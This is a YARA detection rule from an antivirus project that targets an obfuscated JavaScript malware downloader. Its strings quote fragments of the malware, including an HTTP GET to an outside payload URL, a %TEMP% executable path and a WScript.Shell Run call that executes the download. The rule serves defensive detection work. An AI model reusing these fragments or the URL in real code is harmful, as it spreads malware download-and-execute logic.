rule sig_20160329_fbc0946b93733e38bccb3b6a360ef010 {
  meta:
    description = "datamaliciousorder - file 20160329_fbc0946b93733e38bccb3b6a360ef010.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "e27d34a251a408524994a54516f173f97b0fd26345aab617fb8db3860165fbc9"

  strings:
    $s1  = "IK[Q](\"GET\", \"http://www.aluguerdiadema.com/p9wsld\", false);" fullword ascii
    $s2  = "function N() {return j0[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"IvcjJl6BtKSzc.exe\";};" fullword ascii
    $s3  = "for (;;){WScript[QR](i() * 11); if (IK[\"readystate\"] >= 2 * 2) break;};" fullword ascii
    $s4  = "var j0 = function O() {return WScript[j](\"WScript.Shell\");}(), x = 11;" fullword ascii
    $s5  = "function d0(w0, yK){n = n * 1; return w0 - yK;};" fullword ascii
    $s6  = "function zS(){return \"\" + wf;};" fullword ascii
    $s7  = "function bb(Ze){j0[\"Run\"](Ze, n, n);};" fullword ascii
    $s8  = "function d() {return ((N0 == true) && (N0 == z)) ? 1 : n;};" fullword ascii
    $s9  = " while (TZ){" fullword ascii
    $s10 = "function UY()" fullword ascii
    $s11 = "function my(Py) {var t = (1, 2, 3, 4, 5, Py); return t;};" fullword ascii
    $s12 = "return d0(ti, nL);" fullword ascii
    $s13 = "function i(){return 22;};" fullword ascii
    $s14 = "function f(){return j;};" fullword ascii
    $s15 = "var mG = new this[\"Date\"]();" fullword ascii
    $s16 = "N0 = true; " fullword ascii
    $s17 = "var N0 = false;" fullword ascii
    $s18 = "var z = false;" fullword ascii
    $s19 = "z = true; " fullword ascii
    $s20 = "var xz = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}